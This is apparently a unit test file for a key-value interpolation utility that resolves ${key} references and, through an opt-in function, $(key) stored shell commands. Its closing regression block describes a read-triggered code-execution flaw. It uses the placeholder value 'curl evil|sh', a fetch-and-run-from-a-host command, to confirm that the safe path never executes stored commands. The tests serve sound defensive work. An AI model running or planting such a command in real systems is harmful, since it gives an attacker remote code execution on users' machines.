import type { Mock } from 'bun:test';
import { execSync } from 'child_process';
import { interpolate, interpolateExec, interpolateObject, StrictInterpolationError } from '../utils/interpolate';
import { getValue } from '../storage';
import { resolveKey } from '../alias';

// Mock storage and alias modules
vi.mock('../storage', () => ({
  getValue: vi.fn(),
  loadData: vi.fn(() => ({})),
}));

vi.mock('../alias', () => ({
  resolveKey: vi.fn((key: string) => key),
  loadAliases: vi.fn(() => ({})),
}));

vi.mock('child_process', () => ({
  execSync: vi.fn(),
}));

const mockGetValue = getValue as Mock<typeof getValue>;
const mockResolveKey = resolveKey as Mock<typeof resolveKey>;
const mockExecSync = execSync as Mock<typeof execSync>;

beforeEach(() => {
  vi.clearAllMocks();
  mockResolveKey.mockImplementation((key: string) => key);
});

describe('interpolate', () => {
  it('returns plain strings unchanged', () => {
    expect(interpolate('hello world')).toBe('hello world');
  });

  it('resolves a single ${key} reference', () => {
    mockGetValue.mockReturnValueOnce('/home/user');
    expect(interpolate('cd ${paths.home}')).toBe('cd /home/user');
    expect(mockGetValue).toHaveBeenCalledWith('paths.home');
  });

  it('resolves multiple references in one string', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'a') return 'hello';
      if (key === 'b') return 'world';
      return undefined;
    });
    expect(interpolate('${a} and ${b}')).toBe('hello and world');
  });

  it('resolves aliases via resolveKey', () => {
    mockResolveKey.mockImplementation((key: string) => {
      if (key === 'myalias') return 'actual.key';
      return key;
    });
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'actual.key') return 'resolved value';
      return undefined;
    });
    expect(interpolate('${myalias}')).toBe('resolved value');
    expect(mockResolveKey).toHaveBeenCalledWith('myalias');
  });

  it('resolves nested references recursively', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'a') return '${b}/suffix';
      if (key === 'b') return 'base';
      return undefined;
    });
    expect(interpolate('${a}')).toBe('base/suffix');
  });

  it('throws on circular references', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'a') return '${b}';
      if (key === 'b') return '${a}';
      return undefined;
    });
    expect(() => interpolate('${a}')).toThrow(/Circular interpolation/);
  });

  it('throws when referenced key is not found', () => {
    mockGetValue.mockReturnValueOnce(undefined);
    expect(() => interpolate('${nonexistent}')).toThrow('Interpolation failed: "nonexistent" not found');
  });

  it('throws when referenced key is not a string (subtree)', () => {
    mockGetValue.mockReturnValueOnce({ nested: 'object' });
    expect(() => interpolate('${subtree}')).toThrow('Interpolation failed: "subtree" is not a string value');
  });

  it('throws when referenced key is encrypted', () => {
    mockGetValue.mockReturnValueOnce('encrypted::v1:abc');
    expect(() => interpolate('${secret}')).toThrow('Interpolation failed: "secret" is encrypted');
  });

  it('leaves $notref and ${unclosed alone', () => {
    expect(interpolate('$notref')).toBe('$notref');
    expect(interpolate('${unclosed')).toBe('${unclosed');
  });

  it('leaves ${} (empty ref) unchanged', () => {
    expect(interpolate('${}')).toBe('${}');
    expect(interpolate('text ${} more')).toBe('text ${} more');
  });

  it('trims whitespace in key references', () => {
    mockGetValue.mockReturnValueOnce('value');
    expect(interpolate('${ key }')).toBe('value');
    expect(mockResolveKey).toHaveBeenCalledWith('key');
  });

  it('throws when depth limit is exceeded', () => {
    // Create a chain that exceeds maxDepth
    mockGetValue.mockImplementation(() => '${next}');
    expect(() => interpolate('${start}', 1)).toThrow(/depth limit exceeded/);
  });
});

describe('conditional interpolation ${key:-default} and ${key:?error}', () => {
  describe(':- (default value)', () => {
    it('uses default when key is not found', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(interpolate('${missing:-fallback}')).toBe('fallback');
    });

    it('uses existing value when key exists (ignores default)', () => {
      mockGetValue.mockReturnValueOnce('real');
      expect(interpolate('${exists:-fallback}')).toBe('real');
    });

    it('supports empty default value', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(interpolate('${missing:-}')).toBe('');
    });

    it('interpolates ${} references within the default value', () => {
      mockGetValue.mockImplementation((key: string) => {
        if (key === 'missing') return undefined;
        if (key === 'other') return 'resolved';
        return undefined;
      });
      expect(interpolate('${missing:-${other}}')).toBe('resolved');
    });

    it('uses literal default containing colons', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(interpolate('${missing:-http://example.com}')).toBe('http://example.com');
    });

    it('works in a string with surrounding text', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(interpolate('hello ${name:-world}!')).toBe('hello world!');
    });

    it('works alongside normal interpolation', () => {
      mockGetValue.mockImplementation((key: string) => {
        if (key === 'greeting') return 'hi';
        if (key === 'name') return undefined;
        return undefined;
      });
      expect(interpolate('${greeting} ${name:-stranger}')).toBe('hi stranger');
    });
  });

  describe(':? (required with custom error)', () => {
    it('throws custom error when key is not found', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(() => interpolate('${missing:?API key is required}')).toThrow('API key is required');
    });

    it('uses existing value when key exists (no error)', () => {
      mockGetValue.mockReturnValueOnce('real');
      expect(interpolate('${exists:?should not throw}')).toBe('real');
    });

    it('throws generic message when :? has no message', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(() => interpolate('${missing:?}')).toThrow('"missing" is required but not set');
    });

    it('supports error message containing colons', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(() => interpolate('${missing:?error: key not set}')).toThrow('error: key not set');
    });

    it('returns existing value when key exists, even if :? message contains ${:-}', () => {
      mockGetValue.mockReturnValueOnce('real');
      expect(interpolate('${exists:?msg ${x:-y}}')).toBe('real');
    });

    it('throws with literal modValue when :? message contains nested ${:-}', () => {
      mockGetValue.mockReturnValue(undefined);
      expect(() => interpolate('${missing:?msg ${x:-y}}')).toThrow('msg ${x:-y}');
    });
  });

  describe('parseRef ambiguity — modifier value contains the other modifier token', () => {
    it(':- default containing :? is treated as plain default text', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(interpolate('${missing:-text:?not-an-error}')).toBe('text:?not-an-error');
    });

    it(':? message containing :- is treated as plain error text', () => {
      mockGetValue.mockReturnValueOnce(undefined);
      expect(() => interpolate('${missing:?error :-oops}')).toThrow('error :-oops');
    });
  });
});

describe('interpolateObject', () => {
  it('interpolates leaf string values in a flat object', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'base') return '/home';
      return undefined;
    });
    const result = interpolateObject({ path: '${base}/docs' });
    expect(result['path']).toBe('/home/docs');
  });

  it('keeps encrypted values as-is', () => {
    const result = interpolateObject({ secret: 'encrypted::v1:abc' });
    expect(result['secret']).toBe('encrypted::v1:abc');
  });

  it('keeps raw value if interpolation fails on a leaf', () => {
    mockGetValue.mockReturnValue(undefined);
    const result = interpolateObject({ path: '${missing}/file' });
    expect(result['path']).toBe('${missing}/file');
  });

  // Regression for the v1.11 flogging finding: interpolateObject was
  // catching ALL errors and silently returning the raw template, including
  // `:?` required-check failures and circular-reference detections. The
  // user explicitly opted into fail-loud behavior with `:?`, and a cycle
  // is a structural bug that must surface — both should propagate.
  describe('strict error propagation', () => {
    it('re-throws StrictInterpolationError from `:?` required-check', () => {
      mockGetValue.mockReturnValue(undefined);
      expect(() =>
        interpolateObject({ path: '${missing:?must be set}' })
      ).toThrow(StrictInterpolationError);
      expect(() =>
        interpolateObject({ path: '${missing:?must be set}' })
      ).toThrow(/must be set/);
    });

    it('re-throws StrictInterpolationError from circular references', () => {
      mockGetValue.mockImplementation((key: string) => {
        if (key === 'a') return '${b}';
        if (key === 'b') return '${a}';
        return undefined;
      });
      expect(() =>
        interpolateObject({ path: '${a}' })
      ).toThrow(StrictInterpolationError);
    });

    it('still swallows plain "not found" errors as raw fallback', () => {
      // Plain misses (no `:?`) keep the friendly subtree-fallback behavior:
      // one broken leaf shouldn't fail the whole subtree get.
      mockGetValue.mockReturnValue(undefined);
      const result = interpolateObject({
        good: 'plain',
        bad: '${missing}/x',
      });
      expect(result['good']).toBe('plain');
      expect(result['bad']).toBe('${missing}/x');
    });
  });
});

// SECURITY: $(key) exec resolution is OPT-IN via interpolateExec(). The plain
// interpolate() (safe default) must NEVER execute — see the dedicated
// "safe interpolate() never executes $(key)" block below. These tests exercise
// the exec engine through its only entry point, interpolateExec().
describe('exec interpolation $(key) — via interpolateExec', () => {
  it('executes stored command and returns stdout', () => {
    mockGetValue.mockReturnValueOnce('echo hello');
    mockExecSync.mockReturnValueOnce('hello\n');

    expect(interpolateExec('$(cmd)')).toBe('hello');
    expect(mockExecSync).toHaveBeenCalledWith('echo hello', expect.objectContaining({
      encoding: 'utf-8',
      timeout: 10000,
    }));
  });

  it('caches exec results — same key only executed once', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'cmd') return 'whoami';
      return undefined;
    });
    mockExecSync.mockReturnValue('kh\n');

    expect(interpolateExec('$(cmd) and $(cmd)')).toBe('kh and kh');
    expect(mockExecSync).toHaveBeenCalledTimes(1);
  });

  it('interpolates ${} inside stored command before executing', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'cmd') return 'echo ${name}';
      if (key === 'name') return 'world';
      return undefined;
    });
    mockExecSync.mockReturnValueOnce('world\n');

    expect(interpolateExec('$(cmd)')).toBe('world');
    expect(mockExecSync).toHaveBeenCalledWith('echo world', expect.anything());
  });

  it('handles mixed ${a} and $(b) in same string', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'user') return 'kh';
      if (key === 'cmd') return 'echo hi';
      return undefined;
    });
    mockExecSync.mockReturnValueOnce('hi\n');

    expect(interpolateExec('/Users/${user}/$(cmd)')).toBe('/Users/kh/hi');
  });

  it('throws when exec key is not found', () => {
    mockGetValue.mockReturnValueOnce(undefined);
    expect(() => interpolateExec('$(missing)')).toThrow('Exec interpolation failed: "missing" not found');
  });

  it('throws when exec key is a subtree (not a string)', () => {
    mockGetValue.mockReturnValueOnce({ nested: 'object' });
    expect(() => interpolateExec('$(subtree)')).toThrow('Exec interpolation failed: "subtree" is not a string value');
  });

  it('throws when exec key is encrypted', () => {
    mockGetValue.mockReturnValueOnce('encrypted::v1:abc');
    expect(() => interpolateExec('$(secret)')).toThrow('Exec interpolation failed: "secret" is encrypted');
  });

  it('throws on non-zero exit code', () => {
    mockGetValue.mockReturnValueOnce('exit 42');
    const err: any = new Error('Command failed');
    err.status = 42;
    mockExecSync.mockImplementationOnce(() => { throw err; });

    expect(() => interpolateExec('$(fail)')).toThrow('Exec interpolation failed: "fail" exited with code 42');
  });

  it('detects circular exec references', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'a') return '$(a)';
      return undefined;
    });
    expect(() => interpolateExec('$(a)')).toThrow(/Circular interpolation/);
  });

  it('detects circular cross-type references (${} → $())', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'a') return '$(b)';
      if (key === 'b') return '${a}';
      return undefined;
    });
    expect(() => interpolateExec('${a}')).toThrow(/Circular interpolation/);
  });

  it('leaves $(unclosed alone (no closing paren)', () => {
    expect(interpolateExec('$(unclosed')).toBe('$(unclosed');
  });

  it('trims whitespace in exec key reference', () => {
    mockGetValue.mockReturnValueOnce('echo ok');
    mockExecSync.mockReturnValueOnce('ok\n');

    expect(interpolateExec('$( cmd )')).toBe('ok');
    expect(mockResolveKey).toHaveBeenCalledWith('cmd');
  });

  it('respects depth limit for exec interpolation', () => {
    mockGetValue.mockImplementation(() => '$(next)');
    // positional allowExec=true with a shallow maxDepth
    expect(() => interpolate('$(start)', 1, new Set(), new Map(), true)).toThrow(/depth limit exceeded/);
  });

  it('returns plain strings without $( unchanged', () => {
    expect(interpolateExec('no exec here')).toBe('no exec here');
    expect(mockExecSync).not.toHaveBeenCalled();
  });
});

// SECURITY REGRESSION (read = RCE, fixed): the safe default must never run a
// stored command. A hostile .reverie/ store shipped in a cloned repo could
// otherwise achieve code execution the moment an agent merely READ an entry.
describe('safe interpolate() never executes $(key)', () => {
  it('leaves $(key) literal and does NOT execSync (single value)', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'pwn' ? 'curl evil|sh' : undefined));
    mockExecSync.mockReturnValue('PWNED\n');

    expect(interpolate('status: $(pwn)')).toBe('status: $(pwn)');
    expect(mockExecSync).not.toHaveBeenCalled();
  });

  it('still resolves ${value} refs while leaving $(exec) refs literal', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'name') return 'world';
      if (key === 'pwn') return 'curl evil|sh';
      return undefined;
    });
    expect(interpolate('${name} $(pwn)')).toBe('world $(pwn)');
    expect(mockExecSync).not.toHaveBeenCalled();
  });

  it('interpolateObject (read path for get --values) never executes $(key)', () => {
    mockGetValue.mockImplementation((key: string) => (key === 'cmd' ? 'whoami' : undefined));
    mockExecSync.mockReturnValue('kh\n');

    const result = interpolateObject({ a: '$(cmd)', b: '$(cmd)' });

    expect(result['a']).toBe('$(cmd)');
    expect(result['b']).toBe('$(cmd)');
    expect(mockExecSync).not.toHaveBeenCalled();
  });

  it('does not execute $(key) reached indirectly through a ${value} ref', () => {
    mockGetValue.mockImplementation((key: string) => {
      if (key === 'wrapper') return '$(pwn)';
      if (key === 'pwn') return 'curl evil|sh';
      return undefined;
    });
    // ${wrapper} resolves to the literal text "$(pwn)" but must not then exec it
    expect(interpolate('${wrapper}')).toBe('$(pwn)');
    expect(mockExecSync).not.toHaveBeenCalled();
  });
});
